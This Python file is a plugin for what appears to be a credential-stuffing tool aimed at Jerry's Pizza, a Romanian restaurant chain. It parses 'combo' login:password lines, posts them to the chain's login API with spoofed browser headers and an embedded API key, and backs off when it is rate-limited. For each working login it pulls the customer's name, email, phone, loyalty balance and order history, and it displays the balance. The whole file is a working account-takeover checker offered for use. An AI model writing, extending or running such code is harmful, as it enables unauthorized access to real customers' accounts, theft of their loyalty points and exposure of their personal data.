import asyncio
import re
import os
from typing import Dict, Optional
import aiohttp
from plugins.base import WebsitePlugin

class JerrysPizzaPlugin(WebsitePlugin):
    @property
    def name(self) -> str:
        return "jerryspizza"
    
    @property
    def display_name(self) -> str:
        return "Jerry's Pizza"
    
    def __init__(self):
        self.api_base = "https://app.jerryspizza.ro/api2/index.php"
        self.headers = {
            'AUTH-TYPE': '2',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'CITY-ID': '61',
            'COUNTY-ID': '9',
            'Host': 'app.jerryspizza.ro',
            'OS': 'web',
            'Origin': 'https://www.jerryspizza.ro',
            'Referer': 'https://www.jerryspizza.ro/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'TEST': '0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'VERSION': '2.0',
            'X-API-KEY': 'S0l5Tu324M4rL9A2',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }
    
    def normalize_phone(self, phone: str) -> str:
        """Normalize phone number by removing +40, spaces, and other characters"""
        phone = re.sub(r'[\s\-\(\)]+', '', phone)
        phone = re.sub(r'^\+?40', '', phone)
        if len(phone) == 10 and phone.startswith('0'):
            phone = phone[1:]
        return phone
    
    def parse_combo_line(self, login: str, password: str) -> Dict[str, str]:
        """Parse and normalize login credentials"""
        login = login.strip()
        password = password.strip()
        
        # Check if login looks like a phone number
        if re.match(r'^[\+\d\s\-\(\)]+$', login):
            normalized = self.normalize_phone(login)
            if len(normalized) >= 9:
                return {'login': normalized, 'password': password, 'original_login': login}
        
        return {'login': login, 'password': password, 'original_login': login}
    
    def create_multipart_body(self, login: str, password: str) -> tuple:
        """Create multipart/form-data body for login request"""
        boundary = '----WebKitFormBoundary' + os.urandom(16).hex()[:16]
        
        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="mobilePhone"\r\n\r\n'
            f'{login}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="password"\r\n\r\n'
            f'{password}\r\n'
            f'--{boundary}--\r\n'
        )
        
        return body.encode('utf-8'), boundary
    
    async def check_account(self, session: aiohttp.ClientSession, login: str, password: str, original_login: str) -> Optional[Dict]:
        """Check a single account and return account info if valid"""
        try:
            body, boundary = self.create_multipart_body(login, password)
            
            req_headers = self.headers.copy()
            req_headers['Content-Type'] = f'multipart/form-data; boundary={boundary}'
            req_headers['Content-Length'] = str(len(body))
            
            async with session.post(
                f'{self.api_base}/auth/login',
                data=body,
                headers=req_headers,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as response:
                if response.status == 429:
                    print(f"\n[!] Rate limit detected (429). Waiting 5 seconds...")
                    await asyncio.sleep(5)
                    return None
                elif response.status == 503:
                    print(f"\n[!] Service unavailable (503). Waiting 3 seconds...")
                    await asyncio.sleep(3)
                    return None
                elif response.status >= 500:
                    print(f"\n[!] Server error ({response.status}). Waiting 2 seconds...")
                    await asyncio.sleep(2)
                    return None
                
                login_data = await response.json()
                
                if login_data.get('error', True):
                    return None
                
                token = login_data.get('token')
                customer = login_data.get('customer', {})
                customer_id = customer.get('id')
                
                if not token or not customer_id:
                    return None
                
                auth_headers = self.headers.copy()
                auth_headers['Authorization'] = f'Bearer {token}'
                auth_headers['USER-ID'] = customer_id
                
                # Fetch account details
                async with session.get(
                    f'{self.api_base}/customer/me',
                    headers=auth_headers,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as me_response:
                    me_data = await me_response.json()
                    loyalty_balance = me_data.get('loyaltyBalance', 0)
                
                # Fetch order history
                async with session.get(
                    f'{self.api_base}/order/all?id={customer_id}',
                    headers=auth_headers,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as orders_response:
                    orders_data = await orders_response.json()
                    orders = orders_data.get('orders', [])
                    order_count = len(orders)
                    total_spent = sum(float(order.get('total', 0)) for order in orders)
                
                return {
                    'website': self.name,
                    'login': original_login,
                    'password': password,
                    'firstName': customer.get('firstName', ''),
                    'lastName': customer.get('lastName', ''),
                    'email': customer.get('email', ''),
                    'mobilePhone': customer.get('mobilePhone', ''),
                    'loyaltyBalance': loyalty_balance,
                    'orderCount': order_count,
                    'totalSpent': round(total_spent, 2),
                    'registerDate': customer.get('registerDate', ''),
                    'customerId': customer_id
                }
                
        except asyncio.TimeoutError:
            return None
        except aiohttp.ClientConnectorError:
            await asyncio.sleep(2)
            return None
        except:
            return None
    
    def format_account_display(self, account: Dict) -> str:
        """Format account data for console display"""
        return f"{account['login']} | Balance: {account['loyaltyBalance']} | Orders: {account['orderCount']} | Total: ${account['totalSpent']}"
    
    def get_balance_key(self) -> str:
        """Get the key name for balance/points in account data"""
        return 'loyaltyBalance'
